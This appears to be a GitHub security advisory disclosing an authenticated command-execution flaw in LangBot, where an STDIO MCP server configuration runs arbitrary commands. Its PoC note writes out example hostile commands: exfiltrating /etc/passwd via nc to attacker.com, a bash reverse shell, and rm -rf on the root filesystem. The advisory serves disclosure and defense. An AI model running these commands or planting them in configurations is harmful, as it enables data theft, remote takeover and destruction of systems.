# [H] LangBot: Authenticated RCE Via MCP Configuration

## Summary
Severity: High
Advisory: GHSA-3pvh-63gf-j9mw
CVE: CVE-2026-54449
CWE: CWE-77
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-07-15
Source: https://github.com/advisories/GHSA-3pvh-63gf-j9mw
Type: github-advisory

## Affected
- PyPI: `langbot` — affected >=0

## Details
### Summary
Any authenticated user can achieve arbitrary command execution on the LangBot servers through changing the MCP Server Configuration by added an "STDIO" MCP with an arbitrary command.

### Details
The repository uses StdioServerParameters which is based on Anthropic's modelcontextprotocol open source, inside the code - src/langbot/pkg/provider/tools/loaders/mcp.py - StdioServerParameters is imported from mcp, which executes a given command which runs a subprocess on the target machine.

Since the LangBot services are authenticated, an attacker finding an open server needs to sign up or login via stolen credentials, then the attacker can use the MCP configuration to enter any arbitrary command, giving the ability to completely take over the machine.

### PoC
1. Open the LangBot server
2. Navigate to Extensions
3. Open the "MCP" tab and press "Add"
4. Choose an STDIO server configuration
5. Add any arbitrary command with arguments
<img width="480" height="538" alt="Screenshot 2026-01-19 at 15 08 43" src="https://github.com/user-attachments/assets/c341afa8-68c0-4c34-b5b6-ad8796184bdd" />

Note that an attacker could use this configuration to enter any arbitrary command, including data exfiltration (cat /etc/passwd | nc attacker.com 4444), opening a reverse shell (bash -i >& /dev/tcp/10.0.0.1/8080 0>&1), potentially removing the whole machine's data (rm -rf / --no-preserve-root), and many more.

### Impact
This is an authenticated remote code execution vulnerability (RCE), affecting any publicly available LangBot instance, and local instances when in the same network as the attacker (Lateral Movement).
CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection').

### Video POC
https://github.com/user-attachments/assets/4868d232-7453-442c-bffd-60f0ad4679ea

### Resources
https://www.ox.security/blog/the-mother-of-all-ai-supply-chains-critical-systemic-vulnerability-at-the-core-of-the-mcp/
https://www.ox.security/blog/mcp-supply-chain-advisory-rce-vulnerabilities-across-the-ai-ecosystem/

## References
- https://github.com/langbot-app/LangBot/security/advisories/GHSA-3pvh-63gf-j9mw
- https://github.com/langbot-app/LangBot
